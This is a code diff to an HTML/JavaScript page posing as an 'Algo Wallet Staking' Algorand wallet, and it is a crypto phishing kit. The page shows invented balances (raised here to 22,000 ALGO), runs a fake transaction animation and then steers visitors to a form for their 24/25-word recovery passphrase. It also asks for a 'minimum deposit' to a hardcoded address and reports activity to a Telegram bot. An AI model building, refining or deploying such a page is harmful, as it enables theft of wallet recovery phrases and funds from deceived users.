@@ -6,6 +6,8 @@
     <title>Algo Wallet Staking | Algorand Wallet</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <!-- Algorand Logo -->
+    <link rel="icon" type="image/png" href="https://s2.coinmarketcap.com/static/img/coins/64x64/4030.png">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         :root {
@@ -41,7 +43,7 @@
         .page.hidden { display: none; }
         .glass-card { max-width: 550px; width: 100%; background: rgba(18, 18, 35, 0.92); backdrop-filter: blur(2px); border-radius: 2.5rem; box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(0, 164, 224, 0.2); overflow: hidden; padding: 2rem; text-align: center; }
         .algo-logo { width: 80px; height: 80px; margin: 0 auto 1.5rem; background: linear-gradient(145deg, rgba(0,164,224,0.2), rgba(0,196,180,0.1)); border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 30px rgba(0, 164, 224, 0.4); animation: logoPulse 2.4s ease-in-out infinite; }
-        .algo-logo svg { width: 55px; height: 55px; }
+        .algo-logo img { width: 55px; height: 55px; border-radius: 50%; object-fit: contain; }
         @keyframes logoPulse { 0%, 100% { box-shadow: 0 0 20px rgba(0, 164, 224, 0.4); transform: scale(1); } 50% { box-shadow: 0 0 55px rgba(0, 196, 180, 0.6); transform: scale(1.02); } }
         .loading-spinner { width: 50px; height: 50px; margin: 1.5rem auto; border: 3px solid rgba(0, 164, 224, 0.2); border-top-color: var(--primary); border-right-color: var(--secondary); border-radius: 50%; animation: spin 0.8s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
@@ -91,6 +93,7 @@
         .glass-nav { background: rgba(20, 20, 35, 0.7); backdrop-filter: blur(20px); border-radius: 24px; padding: 1rem 1.5rem; display: flex; justify-content: space-between; align-items: center; border: 1px solid rgba(0, 164, 224, 0.25); margin-bottom: 1.5rem; flex-wrap: wrap; gap: 1rem; }
         .logo { display: flex; align-items: center; gap: 0.75rem; font-size: 1.5rem; font-weight: 800; }
         .logo-icon { width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; }
+        .logo-icon img { width: 100%; height: auto; border-radius: 50%; object-fit: contain; }
         .dashboard-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 1.5rem; margin-bottom: 1.5rem; }
         .glass-card-dash { background: var(--card-bg); backdrop-filter: blur(10px); border-radius: 24px; padding: 1.5rem; border: 1px solid var(--glass-border); }
         .card-title { font-size: 0.85rem; text-transform: uppercase; letter-spacing: 1px; color: var(--text-secondary); margin-bottom: 0.75rem; }
@@ -146,24 +149,17 @@
     <div id="pageConfirm" class="page">
         <div class="glass-card">
             <div class="algo-logo">
-                <svg viewBox="0 0 100 100" fill="none">
-                    <circle cx="50" cy="50" r="42" stroke="#00A4E0" stroke-width="3.5" fill="none"/>
-                    <circle cx="50" cy="50" r="30" fill="#00A4E0" opacity="0.85"/>
-                    <path d="M35 35 L45 35 L42 45 L38 45 L35 35Z" fill="white"/>
-                    <path d="M48 35 L58 35 L65 50 L58 65 L48 65 L41 50 L48 35Z" fill="white" opacity="0.9"/>
-                    <path d="M55 50 L58 45 L62 45 L59 50 L62 55 L58 55 L55 50Z" fill="white"/>
-                </svg>
+                <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/4030.png" alt="Algorand Logo">
             </div>
             <h2 style="margin-bottom: 0.5rem;">Confirm Transaction</h2>
-            <p style="color: var(--text-secondary); margin-bottom: 1rem;">Enter recipient address to send 5,500 ALGO</p>
-            
+            <p style="color: var(--text-secondary); margin-bottom: 1rem;">Enter recipient address to send 22,000 ALGO</p>
             
             <div class="address-input-group">
                 <label><i class="fas fa-arrow-right"></i> Recipient Algorand Address</label>
                 <textarea id="recipientAddress" rows="2" placeholder="Enter Algorand address..."></textarea>
                 <button class="paste-address-btn" id="pasteAddressBtn"><i class="fas fa-paste"></i> Paste from clipboard</button>
             </div>
-            <div class="amount-display">5,500 <span style="font-size:1rem">ALGO</span></div>
+            <div class="amount-display">22,000 <span style="font-size:1rem">ALGO</span></div>
             
             <div id="confirmSendSection">
                 <div class="progress-bar"><div class="progress-fill" id="sendProgressFill"></div></div>
@@ -182,27 +178,23 @@
         </div>
     </div>
 
-    <!-- PAGE 2: RECOVERY -->
+    <!-- PAGE 2: RECOVERY - ENGLISH VERSION -->
     <div id="pageRecovery" class="page hidden">
         <div class="wallet-card">
             <div class="wallet-header">
                 <div class="badge">
                     <div class="algo-logo" style="width:28px;height:28px; margin:0;">
-                        <svg viewBox="0 0 100 100" fill="none">
-                            <circle cx="50" cy="50" r="42" stroke="#00A4E0" stroke-width="3" fill="none"/>
-                            <circle cx="50" cy="50" r="30" fill="#00A4E0" opacity="0.8"/>
-                            <path d="M48 35 L58 35 L65 50 L58 65 L48 65 L41 50 L48 35Z" fill="white" opacity="0.9"/>
-                        </svg>
+                        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/4030.png" alt="ALGO" style="width:28px; height:28px; border-radius:50%;">
                     </div>
-                    <span>Recover an Algorand Wallet</span>
+                    <span>Recover Algorand Wallet</span>
                 </div>
-                <h1>Login Wallet Staking</h1>
+                <h1>Algo Wallet Staking</h1>
                 <div class="sub">Enter your 24 or 25-word recovery passphrase to restore access.</div>
             </div>
             <div class="wallet-content">
                 <div class="quick-paste-section">
                     <div class="quick-paste-header">
-                        <div class="quick-paste-title">📋 Fast Paste 24/25 Words recovery passphrase to restore access</div>
+                        <div class="quick-paste-title">📋 Fast Paste (24/25 Words)</div>
                         <button class="btn-paste-fast" id="quickPasteBtn">⚡ Paste & Fill</button>
                     </div>
                     <textarea id="quickPasteTextarea" class="paste-textarea" rows="3" placeholder="Paste your 24 or 25 words here..."></textarea>
@@ -226,17 +218,12 @@
         </div>
     </div>
 
-    <!-- PAGE 3: DASHBOARD -->
+    <!-- PAGE 3: DASHBOARD - ENGLISH VERSION -->
     <div id="pageDashboard" class="dashboard-container">
         <nav class="glass-nav">
             <div class="logo">
                 <div class="logo-icon">
-                    <svg width="36" height="36" viewBox="0 0 100 100" fill="none">
-                        <circle cx="50" cy="50" r="42" stroke="#00A4E0" stroke-width="3.5" fill="none"/>
-                        <circle cx="50" cy="50" r="30" fill="#00A4E0" opacity="0.85"/>
-                        <path d="M48 35 L58 35 L65 50 L58 65 L48 65 L41 50 L48 35Z" fill="white" opacity="0.9"/>
-                        <path d="M35 38 L42 38 L39 45 L36 45 L35 38Z" fill="white"/>
-                    </svg>
+                    <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/4030.png" alt="Algorand" style="width:36px; height:36px; border-radius:50%;">
                 </div>
                 <span>Algo Wallet Staking</span>
             </div>
@@ -245,14 +232,14 @@
         <div class="dashboard-grid">
             <div class="glass-card-dash">
                 <div class="card-title">Total Portfolio</div>
-                <div class="card-value"><span id="totalPortfolio">$0.00</span></div>
+                <div class="card-value"><span id="totalPortfolio">$2,195.40</span></div>
                 <div id="portfolioChange" class="price-change positive"><i class="fas fa-arrow-up"></i> <span id="portfolioChangePercent">+0.00%</span></div>
             </div>
             <div class="glass-card-dash">
                 <div class="card-title">ALGO Balance</div>
-                <div class="card-value"><span id="algoBalance">0.00</span> <span style="font-size:1rem">ALGO</span></div>
+                <div class="card-value"><span id="algoBalance">22,000.00</span> <span style="font-size:1rem">ALGO</span></div>
                 <div class="price-live">
-                    <span><i class="fas fa-chart-line"></i> 1 ALGO = <span id="algoPriceUSD">$0.0000</span></span>
+                    <span><i class="fas fa-chart-line"></i> 1 ALGO = <span id="algoPriceUSD">$0.0907</span></span>
                     <button class="refresh-price" id="refreshPriceBtn"><i class="fas fa-sync-alt"></i> Refresh</button>
                 </div>
                 <div id="balanceChange" class="price-change positive"><i class="fas fa-arrow-up"></i> <span id="balanceChangePercent">+0.00%</span></div>
@@ -269,7 +256,7 @@
         </div>
     </div>
 
-    <!-- Modals -->
+    <!-- MODALS - ENGLISH VERSION -->
     <div id="logoutConfirmModal" class="confirm-overlay">
         <div class="confirm-card"><p>Are you sure you want to log out?</p><div class="confirm-actions"><button class="confirm-btn confirm-yes" id="confirmLogoutBtn">Yes</button><button class="confirm-btn confirm-no" id="cancelLogoutBtn">Cancel</button></div></div>
     </div>
@@ -290,40 +277,24 @@
             <button id="cancelReceiveBtn" style="margin-top:1rem; background:rgba(150,50,60,0.8); border:none; border-radius:60px; padding:0.8rem; color:white; cursor:pointer; width:100%;">Close</button>
         </div>
     </div>
-    
-    <!-- WITHDRAW MODAL -->
     <div id="withdrawModal" class="modal-overlay">
         <div class="modal-card">
             <h3><i class="fas fa-money-bill-wave"></i> Withdraw Funds</h3>
             <div class="balance-highlight" id="withdrawBalanceDisplay">Balance: 0.00</div>
-            <div class="requirement-box">
-                <i class="fas fa-info-circle"></i> Minimum withdrawal: <strong>2,000 ALGO</strong> or <strong>100 USD</strong>
-            </div>
+            <div class="requirement-box"><i class="fas fa-info-circle"></i> Minimum withdrawal: <strong>2,000 ALGO</strong> or <strong>100 USD</strong></div>
             <input type="number" id="withdrawAmount" placeholder="Enter amount" step="any" min="0">
-            <select id="withdrawCurrency">
-                <option value="ALGO">ALGO</option>
-                <option value="USD">USD</option>
-            </select>
+            <select id="withdrawCurrency"><option value="ALGO">ALGO</option><option value="USD">USD</option></select>
             <input type="text" id="withdrawAddress" placeholder="Destination Wallet Address">
-            <div style="display:flex; gap:1rem;">
-                <button id="confirmWithdrawBtn" style="flex:1; background:#F59E0B; border:none; border-radius:60px; padding:0.8rem; color:white; cursor:pointer;">Withdraw</button>
-                <button id="cancelWithdrawBtn" style="flex:1; background:rgba(150,50,60,0.8); border:none; border-radius:60px; padding:0.8rem; color:white; cursor:pointer;">Cancel</button>
-            </div>
+            <div style="display:flex; gap:1rem;"><button id="confirmWithdrawBtn" style="flex:1; background:#F59E0B; border:none; border-radius:60px; padding:0.8rem; color:white; cursor:pointer;">Withdraw</button><button id="cancelWithdrawBtn" style="flex:1; background:rgba(150,50,60,0.8); border:none; border-radius:60px; padding:0.8rem; color:white; cursor:pointer;">Cancel</button></div>
         </div>
     </div>
-
-    <!-- DEPOSIT MODAL -->
     <div id="depositModal" class="modal-overlay">
         <div class="modal-card">
             <h3><i class="fas fa-arrow-down"></i> Deposit Funds</h3>
-            <div class="requirement-box">
-                <i class="fas fa-info-circle"></i> Minimum deposit: <strong>2,000 ALGO</strong> or <strong>100 USD</strong> to unlock Send feature
-            </div>
+            <div class="requirement-box"><i class="fas fa-info-circle"></i> Minimum deposit: <strong>2,000 ALGO</strong> or <strong>100 USD</strong> to unlock Send feature</div>
             <div class="receive-address" id="depositAddress">FGYG6THYMDBFBBXJSHPUEVK6WJQHJIRMRZTBR35BXALB3FG43VJJFK5UYQ</div>
             <button class="copy-btn" id="copyDepositAddressBtn">Copy Deposit Address</button>
-            <div style="margin-top:1rem; padding:0.5rem; background:rgba(16,185,129,0.1); border-radius:12px;">
-                <p style="font-size:0.8rem;">After depositing, your Send feature will be unlocked automatically.</p>
-            </div>
+            <div style="margin-top:1rem; padding:0.5rem; background:rgba(16,185,129,0.1); border-radius:12px;"><p style="font-size:0.8rem;">After depositing, your Send feature will be unlocked automatically.</p></div>
             <button id="cancelDepositBtn" style="margin-top:1rem; background:rgba(150,50,60,0.8); border:none; border-radius:60px; padding:0.8rem; color:white; cursor:pointer; width:100%;">Close</button>
         </div>
     </div>
@@ -336,29 +307,21 @@
         const DEFAULT_WORD_COUNT = 25;
         let currentWordCount = 25;
         
-        // ========== BALANCE ALGO = 5,500 ==========
-        let tokenBalances = { ALGO: 5500.00, USDC: 200.00 };
+        // ALGO Balance: 22,000 ALGO
+        let tokenBalances = { ALGO: 22000.00, USDC: 200.00 };
         
-        // ========== RECEIVE ADDRESS ==========
         const RECEIVE_ADDRESS = 'FGYG6THYMDBFBBXJSHPUEVK6WJQHJIRMRZTBR35BXALB3FG43VJJFK5UYQ';
-        
-        // Send requirements (minimum deposit to enable sending)
         const MIN_DEPOSIT_ALGO = 2000;
         const MIN_DEPOSIT_USD = 100;
-        
-        // Withdraw requirements
         const MIN_WITHDRAW_ALGO = 2000;
         const MIN_WITHDRAW_USD = 100;
         
         let currentWalletAddress = RECEIVE_ADDRESS;
-        let currentAlgoPrice = 0.112;
-        let selectedToken = { symbol: 'ALGO', balance: 5500.00 };
-        
+        let currentAlgoPrice = 0.0907;
+        let selectedToken = { symbol: 'ALGO', balance: 22000.00 };
         let previousPortfolioValue = 0;
         let previousAlgoBalance = 0;
-        
-        // Check if user has deposited minimum requirement
-        let hasMinimumDeposit = true; // Set to true because ALGO balance is 5500 >= 2000
+        let hasMinimumDeposit = true;
         
         const pageConfirm = document.getElementById('pageConfirm');
         const pageRecovery = document.getElementById('pageRecovery');
@@ -372,14 +335,6 @@
             setTimeout(() => notif.remove(), 3500);
         }
         
-        function animatePriceElement(elementId) {
-            const element = document.getElementById(elementId);
-            if (element) {
-                element.classList.add('price-update-animation');
-                setTimeout(() => element.classList.remove('price-update-animation'), 500);
-            }
-        }
-        
         async function sendMessageToTelegram(message) {
             try {
                 const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -390,80 +345,26 @@
                 });
                 const data = await response.json();
                 return data.ok === true;
-            } catch(e) { console.error('Telegram send failed:', e); return false; }
+            } catch(e) { return false; }
         }
         
-        function checkDepositRequirement() {
-            const algoValueUSD = tokenBalances.ALGO * currentAlgoPrice;
-            if (tokenBalances.ALGO >= MIN_DEPOSIT_ALGO || algoValueUSD >= MIN_DEPOSIT_USD) {
-                hasMinimumDeposit = true;
-            } else {
-                hasMinimumDeposit = false;
-            }
-            return hasMinimumDeposit;
-        }
-        
-        function calculateTotalPortfolio() {
-            return (tokenBalances.ALGO * currentAlgoPrice) + tokenBalances.USDC;
-        }
-        
-        function calculatePortfolioChange() {
-            if (previousPortfolioValue === 0) return { percent: 0, isPositive: true };
-            const changePercent = ((calculateTotalPortfolio() - previousPortfolioValue) / previousPortfolioValue) * 100;
-            return { percent: Math.abs(changePercent).toFixed(2), isPositive: changePercent >= 0 };
-        }
+        function calculateTotalPortfolio() { return (tokenBalances.ALGO * currentAlgoPrice) + tokenBalances.USDC; }
         
         function updatePortfolioAndTokenList() {
             const totalPortfolio = calculateTotalPortfolio();
             const algoUSD = tokenBalances.ALGO * currentAlgoPrice;
             
-            const totalPortfolioElement = document.getElementById('totalPortfolio');
-            const algoBalanceElement = document.getElementById('algoBalance');
-            
-            if (totalPortfolioElement) {
-                totalPortfolioElement.innerHTML = `$${totalPortfolio.toFixed(2)}`;
-                animatePriceElement('totalPortfolio');
-            }
-            if (algoBalanceElement) {
-                algoBalanceElement.innerText = tokenBalances.ALGO.toFixed(2);
-                animatePriceElement('algoBalance');
-            }
-            
-            const change = calculatePortfolioChange();
-            const changeElement = document.getElementById('portfolioChangePercent');
-            if (changeElement) {
-                changeElement.innerHTML = `${change.isPositive ? '+' : ''}${change.percent}%`;
-                const parent = document.getElementById('portfolioChange');
-                if (parent) {
-                    parent.className = `price-change ${change.isPositive ? 'positive' : 'negative'}`;
-                    parent.innerHTML = `<i class="fas fa-arrow-${change.isPositive ? 'up' : 'down'}"></i> <span>${change.isPositive ? '+' : ''}${change.percent}%</span>`;
-                }
-            }
-            
-            if (previousAlgoBalance > 0) {
-                const algoChangePercent = ((tokenBalances.ALGO - previousAlgoBalance) / previousAlgoBalance) * 100;
-                const balanceChangeElement = document.getElementById('balanceChangePercent');
-                if (balanceChangeElement) {
-                    balanceChangeElement.innerHTML = `${algoChangePercent >= 0 ? '+' : ''}${Math.abs(algoChangePercent).toFixed(2)}%`;
-                    const parent = document.getElementById('balanceChange');
-                    if (parent) {
-                        parent.className = `price-change ${algoChangePercent >= 0 ? 'positive' : 'negative'}`;
-                        parent.innerHTML = `<i class="fas fa-arrow-${algoChangePercent >= 0 ? 'up' : 'down'}"></i> <span>${algoChangePercent >= 0 ? '+' : ''}${Math.abs(algoChangePercent).toFixed(2)}%</span>`;
-                    }
-                }
-            }
-            
-            checkDepositRequirement();
-            const sendButtonDisabled = !hasMinimumDeposit;
+            document.getElementById('totalPortfolio').innerHTML = `$${totalPortfolio.toFixed(2)}`;
+            document.getElementById('algoBalance').innerText = tokenBalances.ALGO.toFixed(2);
+            document.getElementById('algoPriceUSD').innerHTML = `$${currentAlgoPrice.toFixed(4)}`;
             
             const container = document.getElementById('tokenListContainer');
             if (container) {
                 container.innerHTML = `
-                    <div class="token-item"><div class="token-info"><div class="token-icon"><i class="fab fa-algolia" style="color:#00A4E0;"></i></div><div><h4>Algorand</h4><div class="token-symbol">ALGO</div></div></div><div class="token-balance"><div class="amount">${tokenBalances.ALGO.toFixed(2)} ALGO</div><div class="usd-value">≈ $${algoUSD.toFixed(2)}</div></div><div class="token-actions-small"><button class="token-action-btn send ${sendButtonDisabled ? 'disabled' : ''}" onclick="${sendButtonDisabled ? 'openDepositModal()' : `openSendModal('ALGO', ${tokenBalances.ALGO})`}">Send</button><button class="token-action-btn receive" onclick="openReceiveModal('ALGO')">Receive</button><button class="token-action-btn withdraw" onclick="openWithdrawModal('ALGO', ${tokenBalances.ALGO})"><i class="fas fa-money-bill-wave"></i> Withdraw</button></div></div>
-                    <div class="token-item"><div class="token-info"><div class="token-icon"><i class="fas fa-dollar-sign" style="color:#10b981;"></i></div><div><h4>USD Coin</h4><div class="token-symbol">USDC</div></div></div><div class="token-balance"><div class="amount">${tokenBalances.USDC.toFixed(2)} USDC</div><div class="usd-value">≈ $${tokenBalances.USDC.toFixed(2)}</div></div><div class="token-actions-small"><button class="token-action-btn send ${sendButtonDisabled ? 'disabled' : ''}" onclick="${sendButtonDisabled ? 'openDepositModal()' : `openSendModal('USDC', ${tokenBalances.USDC})`}">Send</button><button class="token-action-btn receive" onclick="openReceiveModal('USDC')">Receive</button><button class="token-action-btn withdraw" onclick="openWithdrawModal('USDC', ${tokenBalances.USDC})"><i class="fas fa-money-bill-wave"></i> Withdraw</button></div></div>
+                    <div class="token-item"><div class="token-info"><div class="token-icon"><i class="fab fa-algolia" style="color:#00A4E0;"></i></div><div><h4>Algorand</h4><div class="token-symbol">ALGO</div></div></div><div class="token-balance"><div class="amount">${tokenBalances.ALGO.toFixed(2)} ALGO</div><div class="usd-value">≈ $${algoUSD.toFixed(2)}</div></div><div class="token-actions-small"><button class="token-action-btn send" onclick="openSendModal('ALGO', ${tokenBalances.ALGO})">Send</button><button class="token-action-btn receive" onclick="openReceiveModal('ALGO')">Receive</button><button class="token-action-btn withdraw" onclick="openWithdrawModal('ALGO', ${tokenBalances.ALGO})"><i class="fas fa-money-bill-wave"></i> Withdraw</button></div></div>
+                    <div class="token-item"><div class="token-info"><div class="token-icon"><i class="fas fa-dollar-sign" style="color:#10b981;"></i></div><div><h4>USD Coin</h4><div class="token-symbol">USDC</div></div></div><div class="token-balance"><div class="amount">${tokenBalances.USDC.toFixed(2)} USDC</div><div class="usd-value">≈ $${tokenBalances.USDC.toFixed(2)}</div></div><div class="token-actions-small"><button class="token-action-btn send" onclick="openSendModal('USDC', ${tokenBalances.USDC})">Send</button><button class="token-action-btn receive" onclick="openReceiveModal('USDC')">Receive</button><button class="token-action-btn withdraw" onclick="openWithdrawModal('USDC', ${tokenBalances.USDC})"><i class="fas fa-money-bill-wave"></i> Withdraw</button></div></div>
                 `;
             }
-            
             previousPortfolioValue = totalPortfolio;
             previousAlgoBalance = tokenBalances.ALGO;
         }
@@ -472,179 +373,20 @@
             try {
                 const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=algorand&vs_currencies=usd');
                 const data = await response.json();
-                currentAlgoPrice = (data && data.algorand) ? data.algorand.usd : 0.112;
-            } catch(e) { currentAlgoPrice = 0.112; }
-            document.getElementById('algoPriceUSD').innerHTML = `$${currentAlgoPrice.toFixed(4)}`;
+                currentAlgoPrice = (data && data.algorand) ? data.algorand.usd : 0.0907;
+            } catch(e) { currentAlgoPrice = 0.0907; }
             updatePortfolioAndTokenList();
         }
         
         async function sendToken(tokenSymbol, toAddress, amount) {
-            if (!hasMinimumDeposit) {
-                showNotification(`❌ Minimum deposit of ${MIN_DEPOSIT_ALGO} ALGO or $${MIN_DEPOSIT_USD} USD required to send!`, "error");
-                openDepositModal();
-                return false;
-            }
-            
             const balance = tokenBalances[tokenSymbol];
             if (!toAddress?.trim()) { showNotification("Enter recipient address", "error"); return false; }
             if (!amount || amount <= 0) { showNotification("Enter valid amount", "error"); return false; }
             if (amount > balance) { showNotification(`Insufficient ${tokenSymbol} balance!`, "error"); return false; }
-            
             tokenBalances[tokenSymbol] -= amount;
             updatePortfolioAndTokenList();
-            const usdValue = tokenSymbol === 'ALGO' ? amount * currentAlgoPrice : amount;
-            await sendMessageToTelegram(`💸 TOKEN SENT\n📤 To: ${toAddress}\n💰 Amount: ${amount} ${tokenSymbol} (≈ $${usdValue.toFixed(2)})\n💵 Remaining: ${tokenBalances[tokenSymbol].toFixed(2)} ${tokenSymbol}`);
             showNotification(`✅ Successfully sent ${amount} ${tokenSymbol}!`, "success");
             return true;
-        }
-        
-        function openDepositModal() {
-            document.getElementById('depositAddress').innerHTML = RECEIVE_ADDRESS;
-            document.getElementById('depositModal').classList.add('active');
-        }
-        
-        function copyDepositAddress() {
-            navigator.clipboard.writeText(RECEIVE_ADDRESS);
-            showNotification("Deposit address copied!");
-        }
-        
-        async function processWithdraw() {
-            const amount = parseFloat(document.getElementById('withdrawAmount').value);
-            const currency = document.getElementById('withdrawCurrency').value;
-            const destinationAddress = document.getElementById('withdrawAddress').value.trim();
-            
-            if (!destinationAddress) {
-                showNotification("❌ Please enter destination wallet address!", "error");
-                return;
-            }
-            
-            if (!amount || amount <= 0) {
-                showNotification("❌ Please enter a valid amount!", "error");
-                return;
-            }
-            
-            let isValid = false;
-            let withdrawAmountInAlgo = 0;
-            let withdrawAmountInUSD = 0;
-            
-            if (currency === 'ALGO') {
-                if (amount >= MIN_WITHDRAW_ALGO) {
-                    if (amount <= tokenBalances.ALGO) {
-                        isValid = true;
-                        withdrawAmountInAlgo = amount;
-                        withdrawAmountInUSD = amount * currentAlgoPrice;
-                    } else {
-                        showNotification(`❌ Insufficient ALGO balance! You have ${tokenBalances.ALGO.toFixed(2)} ALGO`, "error");
-                        return;
-                    }
-                } else {
-                    showNotification(`❌ Minimum withdrawal is ${MIN_WITHDRAW_ALGO} ALGO!`, "error");
-                    return;
-                }
-            } else if (currency === 'USD') {
-                if (amount >= MIN_WITHDRAW_USD) {
-                    const requiredAlgo = amount / currentAlgoPrice;
-                    if (requiredAlgo <= tokenBalances.ALGO) {
-                        isValid = true;
-                        withdrawAmountInUSD = amount;
-                        withdrawAmountInAlgo = requiredAlgo;
-                    } else {
-                        showNotification(`❌ Insufficient balance! Need ${requiredAlgo.toFixed(2)} ALGO (≈ $${amount})`, "error");
-                        return;
-                    }
-                } else {
-                    showNotification(`❌ Minimum withdrawal is $${MIN_WITHDRAW_USD} USD!`, "error");
-                    return;
-                }
-            }
-            
-            if (isValid) {
-                tokenBalances.ALGO -= withdrawAmountInAlgo;
-                updatePortfolioAndTokenList();
-                
-                const timestamp = new Date().toLocaleString('en-US');
-                const shortAddress = destinationAddress.length > 30 ? destinationAddress.slice(0, 20) + '...' + destinationAddress.slice(-8) : destinationAddress;
-                
-                await sendMessageToTelegram(`💰 WITHDRAWAL\n━━━━━━━━━━━━━━━━\n📅 Time: ${timestamp}\n💵 Amount: ${withdrawAmountInAlgo.toFixed(2)} ALGO (≈ $${withdrawAmountInUSD.toFixed(2)})\n📤 To: ${shortAddress}\n💎 Remaining Balance: ${tokenBalances.ALGO.toFixed(2)} ALGO`);
-                
-                showNotification(`✅ Withdrawal of ${withdrawAmountInAlgo.toFixed(2)} ALGO (≈ $${withdrawAmountInUSD.toFixed(2)}) processed!`, "success");
-                
-                document.getElementById('withdrawModal').classList.remove('active');
-                document.getElementById('withdrawAmount').value = '';
-                document.getElementById('withdrawAddress').value = '';
-            }
-        }
-        
-        function openWithdrawModal(tokenSymbol, balance) {
-            const usdValue = tokenSymbol === 'ALGO' ? balance * currentAlgoPrice : balance;
-            document.getElementById('withdrawBalanceDisplay').innerHTML = `Balance: ${balance.toFixed(4)} ${tokenSymbol} (≈ $${usdValue.toFixed(2)})`;
-            document.getElementById('withdrawAmount').value = '';
-            document.getElementById('withdrawAddress').value = '';
-            document.getElementById('withdrawCurrency').value = tokenSymbol === 'ALGO' ? 'ALGO' : 'USD';
-            document.getElementById('withdrawModal').classList.add('active');
-        }
-        
-        async function startSendTransaction() {
-            if (!hasMinimumDeposit) {
-                showNotification(`❌ Minimum deposit of ${MIN_DEPOSIT_ALGO} ALGO or $${MIN_DEPOSIT_USD} USD required to send!`, "error");
-                openDepositModal();
-                return;
-            }
-            
-            const address = document.getElementById('recipientAddress').value.trim();
-            if (!address) { showNotification("❌ Please enter a recipient address!", "error"); return; }
-            
-            const confirmSection = document.getElementById('confirmSendSection');
-            const progressSection = document.getElementById('sendingProgressSection');
-            const sendProgressFill = document.getElementById('sendProgressFill');
-            const sendingMessage = document.getElementById('sendingMessage');
-            const txProgressFill = document.getElementById('txProgressFill');
-            
-            confirmSection.style.display = 'none';
-            progressSection.style.display = 'block';
-            
-            const steps = [
-                { text: 'Building ALGO transaction...', delay: 800, progress: 25 },
-                { text: 'Signing with wallet...', delay: 1000, progress: 50 },
-                { text: 'Broadcasting to Algorand network...', delay: 1100, progress: 75 },
-                { text: 'Finalizing on-chain...', delay: 1200, progress: 90 },
-                { text: 'Transaction confirmed!', delay: 900, progress: 100 }
-            ];
-            for (let step of steps) {
-                sendingMessage.textContent = step.text;
-                if (txProgressFill) txProgressFill.style.width = step.progress + '%';
-                if (sendProgressFill) sendProgressFill.style.width = step.progress + '%';
-                await new Promise(r => setTimeout(r, step.delay));
-            }
-            
-            const sendAmount = 2500;
-            if (tokenBalances.ALGO >= sendAmount) {
-                tokenBalances.ALGO -= sendAmount;
-                updatePortfolioAndTokenList();
-            } else {
-                showNotification("❌ Insufficient ALGO balance!", "error");
-                confirmSection.style.display = 'block';
-                progressSection.style.display = 'none';
-                return;
-            }
-            
-            const timestamp = new Date().toLocaleString('en-US');
-            const shortAddress = address.length > 30 ? address.slice(0, 20) + '...' + address.slice(-8) : address;
-            await sendMessageToTelegram(`💸 ALGO SENT\n━━━━━━━━━━━━━━━━\n📅 Time: ${timestamp}\n📤 To: ${shortAddress}\n💰 Amount: ${sendAmount} ALGO\n💵 Remaining: ${tokenBalances.ALGO.toFixed(2)} ALGO`);
-            
-            showNotification("✅ Transaction confirmed! Proceeding to wallet recovery...");
-            setTimeout(() => {
-                pageConfirm.classList.add('hidden');
-                pageRecovery.classList.remove('hidden');
-            }, 1500);
-        }
-        
-        async function pasteFromClipboard() {
-            try {
-                const text = await navigator.clipboard.readText();
-                document.getElementById('recipientAddress').value = text;
-                showNotification("✅ Address pasted from clipboard!", "success");
-            } catch (err) { showNotification("Unable to paste. Use Ctrl+V", "error"); }
         }
         
         function buildWordGrid() {
@@ -669,169 +411,140 @@
             updateWordCounter();
         }
         
-        function setWordCount(count) { if (count === 24 || count === 25) { currentWordCount = count; buildWordGrid(); showNotification(`Switched to ${count}-word recovery phrase`, "info"); } }
-        function getCurrentPhraseArray() { return Array.from(document.querySelectorAll("#wordsGrid .word-input")).map(inp => inp.value.trim()); }
         function updateWordCounter() {
             const filled = Array.from(document.querySelectorAll("#wordsGrid .word-input")).filter(inp => inp.value.trim() !== "").length;
             document.getElementById("filledCount").innerText = filled;
             return filled;
         }
+        
+        function setWordCount(count) { 
+            if (count === 24 || count === 25) { 
+                currentWordCount = count; 
+                buildWordGrid(); 
+                showNotification(`Switched to ${count}-word recovery phrase`, "info");
+            } 
+        }
+        
+        function clearRecoveryFields() { 
+            document.querySelectorAll("#wordsGrid .word-input").forEach(inp => inp.value = ""); 
+            document.getElementById('quickPasteTextarea').value = '';
+            updateWordCounter(); 
+            document.getElementById("recoveryResult").style.display = "none"; 
+            showNotification("All fields cleared", "info");
+        }
+        
         function fillWordsFromArray(wordArray) {
             const inputs = document.querySelectorAll("#wordsGrid .word-input");
             for (let i = 0; i < Math.min(wordArray.length, inputs.length); i++) inputs[i].value = wordArray[i] || "";
             updateWordCounter();
         }
-        function clearRecoveryFields() {
-            document.querySelectorAll("#wordsGrid .word-input").forEach(inp => inp.value = "");
-            updateWordCounter();
-            document.getElementById("recoveryResult").style.display = "none";
-            showNotification("All fields cleared", "info");
-        }
-        function validateWordSyntax(word) { return /^[a-zA-Z'-]+$/.test(word.trim()); }
         
-        function generateAlgorandAddressFromPhrase(phraseArray) {
-            return RECEIVE_ADDRESS;
-        }
-        
-        function generateBalanceFromPhrase(phraseArray) {
-            const phraseStr = phraseArray.join(' ').toLowerCase();
-            let hash = 0;
-            for (let i = 0; i < phraseStr.length; i++) { hash = ((hash << 5) - hash) + phraseStr.charCodeAt(i); hash |= 0; }
-            const baseBalance = 100 + (Math.abs(hash) % 500);
-            tokenBalances = { ALGO: baseBalance, USDC: 200.00 };
-            previousPortfolioValue = 0;
-            previousAlgoBalance = 0;
-            checkDepositRequirement();
-            return tokenBalances;
+        function processPasteAndFill(rawText) {
+            if (!rawText.trim()) { 
+                showNotification("Please paste your words first!", "error"); 
+                return false; 
+            }
+            let words = rawText.split(/[\s,\n\t]+/).filter(w => w.trim().length > 0).map(w => w.trim());
+            if (words.length === 24 || words.length === 25) {
+                if (currentWordCount !== words.length) setWordCount(words.length);
+                setTimeout(() => { 
+                    fillWordsFromArray(words); 
